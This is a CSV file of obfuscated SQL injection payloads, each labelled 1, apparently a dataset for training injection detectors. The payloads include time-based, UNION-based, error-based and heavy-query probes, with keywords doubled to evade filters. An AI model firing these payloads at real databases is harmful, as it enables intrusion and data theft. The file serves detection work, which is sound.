Query,Label
"1""  )   wherwheree 2839  =  2839 anandd 5556  =    (  seselectlect count  (  *  )   frfromom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-6848""   )    )    oorr 4071  =  5312",1
"1""  )   anandd 8635  =    (  selecselectt count  (  *  )   frfromom generate_series  (  1,5000000   )    )   --",1
"1%'   )    )     )   uunionnion all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
 (  selselectect * frfromom   (  selselectect  (  sleep  (  5   )    )     )  srmq  )  #,1
1'+  (  sselectelect 'stsu' whwhereere 2386  =  2386 oorr sleep  (  5  )  #,1
"1  )   wherwheree 9149  =  9149 aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nunullll  )  --",1
-5470'   )    )    oorr   (  8459  =  8459  )  *4906 anandd    (    (   'oeam'  =  'oeam,1
1'||  (  selselectect 'hlxd' ffromrom dual whwhereere 2615  =  2615 anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1
-4583'  )   as evbo wwherehere 6055  =  6055 uunionnion all sselectelect 6055--,1
"1%'   )    )     )   oorr 8384  =  lilikeke  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (     (  '%'  =  '",1
1'||  (  selecselectt 'kptj' ffromrom dual whwhereere 5123  =  5123,1
"-3126   )    )    uunionnion all selselectect 6718,6718,6718,6718,6718--",1
"-7448 uniounionn all selselectect 4072,4072#",1
"1""   )    )    aandnd 9800  =  8713",1
"seselectlect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frfromom dual anandd 'fvda' liklikee 'fvda",1
"1' iinn boolean mode  )   oorr 8315  =    (  selecselectt count  (  *  )   ffromrom sysibm.systatablebles as t1,sysibm.systatablebles as t2,sysibm.systatablebles as t3  )  #",1
"-3194""   )    )     )   oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd    (    (     (  ""erua""  =  ""erua",1
"-4919  )   uniounionn all seleselectct 2608,2608,2608,2608,2608,2608#",1
"1"" anandd 6240  =    (  'qqpjq'||  (  sselectelect case 6240 when 6240 then 1 else 0 end ffromrom rdb$databadatabasese  )  ||'qzvzq'  )  ",1
"-2434'   )    )     )   uunionnion all seselectlect 5509,5509,5509,5509,5509,5509,5509--",1
"-7568""   )    )     )   oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd    (    (     (  ""jxge"" liklikee ""jxge",1
"1"" wwherehere 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1""  )   aandnd exp  (  ~  (  seleselectct * ffromrom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd   (  ""hbgv""  =  ""hbgv",1
"-1869""   )    )     )   uunionnion all selecselectt 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1
-8004%'  )   oorr   (  2301  =  7504  )  *7504 aandnd   (  '%'  =  ',1
"iif  (  1378  =  6569,1,1/0  )  ",1
"1,  (  sselectelect   (  case when   (  5726  =  5275  )   then 1 else 1/  (  sselectelect 0  )   end   )    )   ",1
"1""   )    )     )   anandd   (  seleselectct 9067 frofromm  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  ranandd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   anandd    (    (     (  ""blkt"" lilikeke ""blkt",1
"-2605%'   )    )     )   uniounionn all selecselectt 4738,4738#",1
"1%""   )    )     )   waitfoorr delay '0:0:5' anandd    (    (     (  ""%""  =  """,1
"1'   )    )    oorr upupdatedatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   anandd    (    (   'gydh'  =  'gydh",1
"1' uunionnion all selselectect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
5739-5738,1
"-7296%'   )    )     )   uniounionn all selecselectt 9322,9322,9322,9322--",1
sselectelect   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  sselectelect 7033 ffromrom iinnfoorrmation_schema.character_ssetets  )   end  )  #,1
"1"" anandd exp  (  ~  (  selselectect * frofromm   (  selselectect concat  (  0x7171706a71,  (  selselectect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    anandd ""qzzg"" llikeike ""qzzg",1
"1%"" anandd 8594  =    (  selecselectt 8594 frofromm pg_sleep  (  5   )    )   --",1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1
"-4044%"" oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seselectlect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd ""%""  =  """,1
"1""   )    )    as nejd whwhereere 2885  =  2885",1
-2745   )    )    as aywp whewherere 9735  =  9735 oorr 5903  =    (  'qqpjq'||  (  selecselectt case 5903 when 5903 then 1 else 0 end frfromom rdb$databadatabasese  )  ||'qzvzq'  )  --,1
"seleselectct benchmark  (  5000000,md5  (  0x4c4d6142   )    )    aandnd    (    (     (  9847  =  9847",1
"-1844""   )    )     )   oorr make_ssetet  (  9354  =  9354,7185  )   anandd    (    (     (  ""abdw"" llikeike ""abdw",1
"-8651""  )   wherwheree 8391  =  8391 uniounionn all selecselectt 8391,8391#",1
-4562'  )   oorr 3038  =  3038,1
"1""  )   whewherere 7840  =  7840 uniounionn all sselectelect nunullll,nunullll#",1
"-7382'   )    )    oorr make_ssetet  (  9425  =  4330,4330  )   aandnd    (    (   'tvaz' lilikeke 'tvaz",1
"seselectlect count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 anandd   (  ""yobb"" lilikeke ""yobb",1
"1' aandnd elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"-9037%"" uunionnion all selecselectt 6583#",1
"1"" wherwheree 7022  =  7022",1
"-4285'   )    )     )   uunionnion all selecselectt 8819,8819,8819,8819,8819,8819,8819,8819#",1
1 rllikeike   (  selselectect   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,1
"1'   (  seleselectct   (  case when   (  4587  =  4587  )   then regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   frofromm   (  vavalueslues  (  0   )    )     )   anandd 'fsvr'  =  'fsvr",1
"1 aandnd elt  (  1210  =  1210,sleep  (  5   )    )   ",1
seselectlect case when 2948  =  7279 then 1 else nulnulll end--,1
"-1964'  )   as ihsp wwherehere 6379  =  6379 oorr elt  (  6945  =  6165,6165  )  --",1
"1%' uunionnion all seleselectct nulnulll,nulnulll,nulnulll--",1
"1%""   )    )     )   oorr   (  seleselectct 9173 frofromm  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frofromm iinnfoorrmation_schema.character_ssetets group bbyy x  )  a  )   aandnd    (    (     (  ""%""  =  """,1
"-8133'  )   uniunionon all selecselectt 6417,6417,6417,6417,6417,6417,6417,6417--",1
"-5396'||  (  seleselectct 'fjhd' frofromm dual whwhereere 4019  =  4019 uniunionon all seleselectct 4019,4019,4019,4019#",1
"1  )   as wuio whewherere 5312  =  5312 oorr 7552  =    (  seselectlect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1   )    )    aandnd 6414  =    (  seleselectct count  (  *  )   ffromrom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   aandnd    (    (   4048  =  4048",1
"1""  )   whwhereere 3393  =  3393 oorr 9643  =    (  selselectect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  --",1
"1'   )    )    oorr 9643  =    (  selselectect count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )   anandd    (    (   'ozan'  =  'ozan",1
"1%""   )    )     )   aandnd updupdateatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  selecselectt   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   aandnd    (    (     (  ""%""  =  """,1
"1""   )    )    as rign whwhereere 1604  =  1604 aandnd 3661  =  3054--",1
"1'   )    )    aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd    (    (   'ogpg'  =  'ogpg",1
-6813   )    )     )   oorr 6872  =  6872 aandnd    (    (     (  7304  =  7304,1
-1876%'  )   uniunionon all selselectect 6463--,1
-1908'   )    )     )   uniounionn all selselectect 7665#,1
"1  )   as wvpl wherwheree 9791  =  9791 anandd make_sesett  (  3491  =  9067,9067  )  --",1
1%'   )    )    aandnd 7533  =  7533 aandnd    (    (   '%'  =  ',1
"-9858"" oorr 8592  =  8553",1
1 aandnd 3715 iinn    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  seselectlect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,1
-3862'  )   oorr 9323  =  9323#,1
1   )    )     )   anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd    (    (     (  3505  =  3505,1
"1 oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nunullll  )  ,0  )  ,500000000  )  ,nunullll  )  # utdm",1
"1'   )    )     )   oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )   anandd    (    (     (  'cylu'  =  'cylu",1
"1  )   as tjwa whewherere 1173  =  1173 oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  seleselectct   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"-2028%'   )    )     )   oorr 1570  =  convert  (  iinnt,  (  selecselectt char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  selecselectt   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   aandnd    (    (     (  '%'  =  '",1
"1""   )    )    as jrld whewherere 3488  =  3488",1
"1""   )    )     )   oorr 4915  =    (  seselectlect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.ttableables as t3  )  --",1
"-6659'  )   wwherehere 1256  =  1256 ununionion all seselectlect 1256,1256--",1
"-1598   )    )     )   uunionnion all selecselectt 9418,9418,9418,9418,9418,9418,9418#",1
"1'||  (  seselectlect 'mzsy' whwhereere 4940  =  4940 oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-2667  )   uniounionn all sselectelect 5848,5848,5848,5848--",1
1'||  (  seselectlect 'allj' whewherere 7334  =  7334,1
"1"" aandnd elt  (  4249  =  4249,7259  )   aandnd ""kgtz"" lilikeke ""kgtz",1
"1%' aandnd elt  (  1210  =  1210,sleep  (  5   )    )    aandnd '%'  =  '",1
"1%'   )    )     )   uunionnion all sselectelect nulnulll,nulnulll,nulnulll,nulnulll,nulnulll,nulnulll--",1
-5694   )    )    as cxnb whwhereere 6858  =  6858 oorr 9323  =  9323#,1
"-5597'  )   oorr make_ssetet  (  2490  =  2164,2164  )  ",1
1'||  (  seleselectct 'ptkj' frofromm dual whwhereere 6263  =  6263 uunionnion all seleselectct nunullll--,1
1  )   as jdhz wherwheree 2021  =  2021,1
"1%'   )    )     )   oorr 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""  )   wwherehere 9223  =  9223 anandd exp  (  ~  (  seleselectct * frfromom   (  seleselectct concat  (  0x7171706a71,  (  seleselectct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1'   )    )     )   aandnd 3202  =  liklikee  (  'abcdefg',upper  (  hex  (  raandndomblob  (  500000000/2   )    )      )    )    aandnd    (    (     (  'zovb' liklikee 'zovb",1
"1'   )    )     )   anandd make_ssetet  (  8403  =  8403,8899  )   anandd    (    (     (  'zxon' liklikee 'zxon",1
"1'   )    )     )    (  selselectect   (  case when   (  5451  =  5451  )   then regexp_substriinng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nunullll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   frofromm iinnfoorrmation_schema.system_users  )   aandnd    (    (     (  'owga' liklikee 'owga",1
"1""  )   as wvxt whwhereere 7321  =  7321 aandnd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"selecselectt dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   frfromom dual# gnga",1
"1 oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selecselectt   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1
"1 wwherehere 3535  =  3535 anandd 3580  =    (  sselectelect count  (  *  )   frfromom domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tabltablees as t3  )  --",1
"1"" aandnd row  (  6237,7469  )  >  (  selecselectt count  (  *  )  ,concat  (  0x7171706a71,  (  selecselectt   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x frfromom   (  selecselectt 5192 uniounionn selecselectt 3785 uniounionn selecselectt 3931 uniounionn selecselectt 7158  )  a group bbyy x  )   aandnd ""mezx"" liklikee ""mezx",1
"1  )   aandnd 8635  =    (  seselectlect count  (  *  )   frfromom generate_series  (  1,5000000   )    )   --",1
"-7511   )    )    as xqzf wwherehere 9939  =  9939 uniunionon all seselectlect 9939,9939,9939,9939,9939,9939,9939--",1
"1' wwherehere 8803  =  8803 oorr 4411  =    (  selecselectt count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'   )    )    as bbdf wwherehere 1327  =  1327,1
"1  )   as nlig whewherere 5964  =  5964 aandnd 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1%""  )   oorr   (  seselectlect * frofromm   (  seselectlect  (  sleep  (  5   )    )     )  ydpu  )   aandnd   (  ""%""  =  """,1
1   )    )    as kccx whewherere 7547  =  7547 uunionnion all sselectelect nnullull--,1
"1%' aandnd   (  seleselectct 9067 ffromrom  (  seleselectct count  (  *  )  ,concat  (  0x7171706a71,  (  seleselectct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flooorr  (  raandnd  (  0  )  *2   )    )   x ffromrom iinnfoorrmation_schema.character_sesetts group bbyy x  )  a  )   aandnd '%'  =  '",1
-7772'   )    )    oorr 9323  =  9323#,1
"iif  (  5571  =  4947,1,1/0  )  ",1
"-6595   )    )     )   uniunionon all seleselectct 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1
1'   )    )     )   aandnd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seselectlect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   aandnd    (    (     (  'cbnc' lilikeke 'cbnc,1
"1'  )   as vlwh whewherere 9403  =  9403 oorr elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1%""  )   ununionion all selecselectt nulnulll,nulnulll#",1
"-4462%""  )   oorr 8571  =  8571--",1
"1'   )    )     )   aandnd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,nnullull  )   aandnd    (    (     (  'skdy'  =  'skdy",1
1'   )    )     )   oorr   (  selecselectt * ffromrom   (  selecselectt  (  sleep  (  5   )    )     )  ydpu  )   aandnd    (    (     (  'ljhc'  =  'ljhc,1
seleselectct   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  seleselectct 4341 frfromom mysql.db  )   end  )  #,1
"-2625'  )   oorr elt  (  1032  =  1032,3623  )   aandnd   (  'eliy'  =  'eliy",1
"waitfoorr delay '0:0:5' aandnd ""lhcv""  =  ""lhcv",1
"1""  )   whwhereere 2278  =  2278",1
"1   )    )     )   ununionion all seleselectct nulnulll,nulnulll#",1
"1 aandnd 6414  =    (  seselectlect count  (  *  )   frofromm rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1
"selecselectt * frfromom generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   lilimitmit 1--",1
-2527   )    )    as oqpy wherwheree 7468  =  7468 oorr 3038  =  3038,1
1%' waitfoorr delay '0:0:5'--,1
"1' whwhereere 7080  =  7080 oorr 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'+  (  selecselectt 'mikf' wwherehere 5814  =  5814 oorr 5356  =    (  selecselectt count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    as rsnb whewherere 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1"" whewherere 5039  =  5039 anandd char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nnullull  )  ,0  )  ,500000000  )  ,nnullull  )  --",1
1'  )   wwherehere 9516  =  9516,1
"-9871""  )   ununionion all selecselectt 9082#",1
1'||  (  selselectect 'adni' frfromom dual whwhereere 6611  =  6611,1
1   )    )    as wajy wwherehere 8593  =  8593,1
-8404   )    )    oorroorrderder bbyy 1--,1
"-2759%""   )    )    oorr 7769  =  1249#",1
"  (  selecselectt count  (  *  )   frofromm sysibm.systtableables as t1,sysibm.systtableables as t2,sysibm.systtableables as t3  )  ",1
"1  )   as nkjo whwhereere 8462  =  8462 ununionion all sselectelect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1' whwhereere 1628  =  1628 anandd 6510  =    (  seleselectct count  (  *  )   frofromm sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4822"" oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selecselectt   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   ffromrom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    aandnd ""owbp""  =  ""owbp",1
1'  )   whwhereere 2974  =  2974 anandd 4386  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
1   )    )    as dgso wwherehere 4654  =  4654 anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"selselectect count  (  *  )   frofromm generate_series  (  1,5000000  )   anandd    (    (     (  1321  =  1321",1
1'  )   as sagj whewherere 4558  =  4558,1
1%'   )    )    oorr   (  seselectlect * ffromrom   (  seselectlect  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""   )    )     )   oorr extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  selselectect   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    anandd    (    (     (  ""yxpo"" llikeike ""yxpo",1
1'+  (  sselectelect oljg whewherere 2006  =  2006 aandnd 3754  =    (  sselectelect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sselectelect   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   frofromm dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   frofromm dual   )    )   +',1
"1%'  )   oorr exp  (  ~  (  sselectelect * frfromom   (  sselectelect concat  (  0x7171706a71,  (  sselectelect   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    aandnd   (  '%'  =  '",1
"-1993%""  )   oorr 5903  =    (  'qqpjq'||  (  seselectlect case 5903 when 5903 then 1 else 0 end frfromom rdb$datadatabasebase  )  ||'qzvzq'  )   aandnd   (  ""%""  =  """,1
"1  )   as ihan whewherere 5298  =  5298 aandnd elt  (  6587  =  3479,3479  )  --",1
-5356'  )   oorr 9323  =  9323#,1
1'  )   as jztg whewherere 1222  =  1222 oorr sleep  (  5  )  #,1
"1   )    )    anandd 3580  =    (  seleselectct count  (  *  )   frofromm domaiinn.domaiinns as t1,domaiinn.columns as t2,domaiinn.tatablebles as t3  )  --",1
"1   )    )    as gobw wherwheree 3496  =  3496 uniunionon all selselectect nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull,nnullull--",1
"1"" oorr 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   aandnd ""jbty"" llikeike ""jbty",1
"1' oorr char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substriinng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nnullull  )   anandd 'yaje'  =  'yaje",1
-8370'   )    )    oorr   (  3501  =  6407  )  *6407 anandd    (    (   'agcm' llikeike 'agcm,1
"1%""   )    )     )   aandnd 6969  =    (  sselectelect 6969 frofromm pg_sleep  (  5   )    )    aandnd    (    (     (  ""%""  =  """,1
"1"" waitfoorr delay '0:0:5'--",1
"seselectlect count  (  *  )   frofromm generate_series  (  1,5000000  )   aandnd    (    (     (  ""uydm""  =  ""uydm",1
"1'+  (  sselectelect uzan whwhereere 4312  =  4312 aandnd make_ssetet  (  3129  =  9555,9555   )    )   +'",1
"1'  )   oorr upupdatedatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  seselectlect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   aandnd   (  'kejy'  =  'kejy",1
"-9749"" wwherehere 7083  =  7083 oorr make_ssetet  (  7577  =  1182,1182  )  --",1
1%'   )    )     )   anandd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  seleselectct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   anandd    (    (     (  '%'  =  ',1
"-1050""   )    )    oorr 4493  =  utl_iinnaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selselectect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   frfromom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    anandd    (    (   ""oorrfo"" liklikee ""oorrfo",1
1%'   )    )     )   anandd   (  seleselectct * frfromom   (  seleselectct  (  sleep  (  5   )    )     )  gcrr  )  #,1
1'  )   whwhereere 3893  =  3893,1
1%'  )   rllikeike sleep  (  5  )  #,1
"-4182   )    )    as wkfh whewherere 6145  =  6145 uniounionn all selselectect 6145,6145,6145,6145,6145#",1
"1  )   oorr char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substriinng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nulnulll  )  ,0  )  ,500000000  )  ,nulnulll  )  ",1
"1'  )   oorr 8421  =    (  selselectect count  (  *  )   ffromrom generate_series  (  1,5000000   )    )    aandnd   (  'xkxi' llikeike 'xkxi",1
